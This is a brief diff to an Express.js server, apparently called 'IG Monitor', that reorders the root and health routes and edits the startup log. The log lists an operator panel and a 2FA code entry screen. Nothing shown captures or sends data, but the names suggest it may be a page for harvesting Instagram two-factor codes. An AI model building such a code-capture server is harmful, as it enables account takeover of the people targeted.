@@ -745,10 +951,6 @@ app.get("/codigo/", (req, res) => {
     res.sendFile(path.join(CODIGO_DIR, "index.html"));
 });
 
-app.get("/", (req, res) => {
-    res.sendFile(path.join(PUBLIC_DIR, "index.html"));
-});
-
 app.get("/health", (req, res) => {
     res.json({
         status: "ok",
@@ -757,10 +959,14 @@ app.get("/health", (req, res) => {
     });
 });
 
+app.get("/", (req, res) => {
+    res.sendFile(path.join(PUBLIC_DIR, "index.html"));
+});
+
 app.listen(PORT, () => {
     console.log();
     console.log("====================================");
-    console.log(`Servidor rodando em http://localhost:${PORT}`);
+    console.log(`Servidor IG Monitor rodando em http://localhost:${PORT}`);
     console.log(`Painel disponível em http://localhost:${PORT}/painel`);
     console.log(`Tela de 2FA em http://localhost:${PORT}/codigo/`);
     console.log("====================================");
